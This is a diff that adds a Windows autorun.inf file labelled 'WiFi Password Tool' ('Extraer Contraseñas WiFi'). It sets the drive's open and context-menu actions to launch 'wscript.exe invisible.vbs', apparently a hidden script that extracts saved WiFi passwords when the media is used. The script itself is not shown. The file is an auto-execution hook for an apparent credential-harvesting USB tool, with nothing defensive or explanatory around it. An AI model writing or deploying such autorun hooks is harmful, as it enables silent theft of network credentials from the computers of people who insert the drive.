@@ -1,0 +1,7 @@
+[autorun]
+label=WiFi Password Tool
+action=Extraer Contraseñas WiFi
+open=wscript.exe invisible.vbs
+shell=extract
+shell\extract\command=wscript.exe invisible.vbs
+shell\extract\=&Extraer Contraseñas WiFi
